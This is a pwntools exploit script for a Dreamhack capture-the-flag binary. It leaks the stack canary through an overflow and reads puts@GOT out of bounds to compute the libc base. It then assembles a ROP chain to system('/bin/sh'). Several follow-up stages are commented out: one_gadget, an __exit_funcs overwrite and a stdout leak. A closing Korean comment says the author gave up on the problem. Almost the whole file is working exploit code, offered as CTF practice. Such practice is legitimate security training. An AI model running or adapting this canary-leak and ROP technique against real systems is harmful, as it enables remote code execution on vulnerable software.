from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

arch     x86
baddr    0x0
binsz    14349
bintype  elf
bits     64
canary   true
class    ELF64
compiler GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    full
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''

context.binary = elf = ELF('./main')
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host8.dreamhack.games 1234".split()

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    p = process()
    libc = ELF('./libc.so.6')

def slog(n, a): return success(': '.join([n, hex(a)]))

def read(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())

def write(v):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b': ', v)

def make(v):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b': ', v)

pay = b'A'*0x19
make(pay)

p.recvuntil(pay)
cnry = u64(b'\x00'+ p.recv(7))

slog("cnry", cnry)

pay = b'A'*0x18 + p64(cnry)
make(pay)

got = (elf.got["puts"] - 0x4040)

# gdb.attach(p)
# pause()

read(got)
puts_got = u64(p.recvline()[:-1].ljust(8, b'\x00'))
slog("puts@GOT", puts_got)
lb = puts_got - libc.sym["puts"]
slog("libc_base", lb)

rop = ROP(libc)
pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
system = lb + libc.sym["system"]

slog("system", system)

# og_ = [0x583f3, 0x1111da, 0x1111e2, 0x1111e7]
# og = lb + og_[0]

# pay = p64(pop_rdi) + p64(binsh) + p64(system)
# write(pay)

# environ = lb + libc.sym["environ"]

# pay = b'A'*0x18 + p64(cnry) + b'B'*0x8 + p64(og)
# make(pay)

# exit_funcs = lb + 0x21a838
# slog("__exit_funcs offset", 0x21a838)
# slog("__exit_funcs", lb + 0x21a838)

# read(-0x20)
# stdout = u64(p.recvline().strip().ljust(8, b'\x00'))
# slog("stdout", stdout)

# print(exit_funcs-0x4040)

# exit_ = flat(
#     4,
#     system,
#     binsh,
#     0
# )

# write(exit_)

# 머리가 미침. 다른 문제 풀러 감 ㅅㄱ